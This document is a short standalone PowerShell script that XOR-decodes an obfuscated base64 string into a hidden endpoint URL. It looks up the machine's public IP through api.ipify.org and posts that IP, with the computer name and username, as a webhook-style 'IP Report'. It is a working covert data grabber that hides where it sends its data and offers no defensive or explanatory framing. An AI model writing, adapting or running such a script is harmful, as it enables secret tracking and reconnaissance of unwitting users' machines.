$e="Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LT84MjU1MSl1a29va25ua21qY2lvaWNpam1vaHU+Li4xHAMfFjwWK25tBQ8Xbgg+BTRrFTJ3OA0wEyINEA8QBWgoMzBrOSxvEDZiO241LjY2LQI2GCxqEDk+NwowPTsxPQ==";$k=0x5A
$w=[System.Text.Encoding]::UTF8.GetString([byte[]]([Convert]::FromBase64String($e)|%{$_-bxor$k}))
$r=[System.Net.WebRequest]::Create('https://api.ipify.org?format=json')
$s=(New-Object System.IO.StreamReader $r.GetResponse().GetResponseStream()).ReadToEnd()|ConvertFrom-Json
$b='{"embeds":[{"title":"IP Report","color":5763719,"fields":[{"name":"IP","value":"'+$s.ip+'","inline":true},{"name":"Host","value":"'+$env:COMPUTERNAME+'","inline":true},{"name":"User","value":"'+$env:USERNAME+'","inline":true}]}]}'
$c=[System.Net.WebClient]::new();$c.Headers.Add('Content-Type','application/json');$c.UploadString($w,'POST',$b)
